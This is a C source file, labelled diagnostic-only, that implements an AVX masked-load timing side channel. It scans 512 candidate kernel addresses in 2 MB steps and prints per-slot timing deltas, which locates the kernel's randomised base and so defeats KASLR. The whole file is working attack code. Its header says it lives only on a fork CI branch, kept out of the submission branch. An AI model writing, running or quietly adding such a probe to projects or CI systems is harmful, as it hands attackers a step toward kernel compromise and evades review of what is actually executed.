/* Diagnostic-only AVX masked-load timing probe for the COS kernel image.
 * Technique: Choi, Kim and Shin, DAC 2023, https://arxiv.org/pdf/2304.07940
 * This file is only on the fork CI branch, not in the submission branch.
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#if !defined(__x86_64__)
#error This probe requires x86-64
#endif

#define SLOTS 512
#define SAMPLES 32
#define BATCH 64
#define START 0xffffffff80000000ULL
#define STEP 0x200000ULL

static uint64_t masked_load_batch(uintptr_t address)
{
    uint64_t before, after;
    __asm__ volatile(
        "vpxor %%ymm1, %%ymm1, %%ymm1\n\t"
        "mov $64, %%r8d\n\t"
        "lfence\n\trdtsc\n\t"
        "shl $32, %%rdx\n\tor %%rdx, %%rax\n\t"
        "mov %%rax, %0\n\t"
        "1:\n\t"
        "vmaskmovps (%2), %%ymm1, %%ymm0\n\t"
        "dec %%r8d\n\tjnz 1b\n\t"
        "lfence\n\trdtsc\n\t"
        "shl $32, %%rdx\n\tor %%rdx, %%rax\n\t"
        "mov %%rax, %1\n\t"
        : "=&r"(before), "=&r"(after)
        : "r"(address)
        : "rax", "rdx", "r8", "ymm0", "ymm1", "cc", "memory");
    return after - before;
}

static int compare_i64(const void *left, const void *right)
{
    int64_t a = *(const int64_t *)left;
    int64_t b = *(const int64_t *)right;
    return (a > b) - (a < b);
}

static int64_t timing_delta(uintptr_t address, uintptr_t reference)
{
    int64_t values[SAMPLES];
    for (int i = 0; i < SAMPLES; i++)
        values[i] = (int64_t)masked_load_batch(address) -
                    (int64_t)masked_load_batch(reference);
    qsort(values, SAMPLES, sizeof(values[0]), compare_i64);
    return values[SAMPLES / 2];
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (!__builtin_cpu_supports("avx")) {
        puts("AVX_UNAVAILABLE");
        return 1;
    }

    void *hole = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (hole == MAP_FAILED || munmap(hole, 4096) != 0)
        return 1;

    for (int slot = 0; slot < SLOTS; slot++) {
        uintptr_t address = START + (uintptr_t)slot * STEP;
        int64_t delta = timing_delta(address, (uintptr_t)hole);
        printf("AVX_SLOT %03d %#llx %lld\n", slot,
               (unsigned long long)address, (long long)delta);
    }
    puts("AVX_DONE");
    return 0;
}
